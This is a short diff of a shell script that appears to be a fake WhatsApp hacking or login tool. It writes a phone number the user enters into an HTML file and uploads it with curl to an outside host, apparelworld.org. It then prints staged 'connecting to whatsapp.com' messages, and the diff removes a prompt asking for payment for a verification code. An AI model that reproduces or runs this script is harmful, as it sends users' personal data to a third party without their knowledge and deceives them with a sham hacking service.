@@ -23,9 +23,6 @@ echo "Nomer => $nomer" >> kontol.html;
 curl -T kontol.html http://apparelworld.org/
 sleep 5;
 echo "[+] Done.";
-echo "Pay For Get Code PerfectMoney : U19478215";
-read -p "Verify Code => " code;
-sleep 2
 echo "[+] Connecting to whatsapp.com...";
 echo "Login => $nomer";
 sleep 0.5
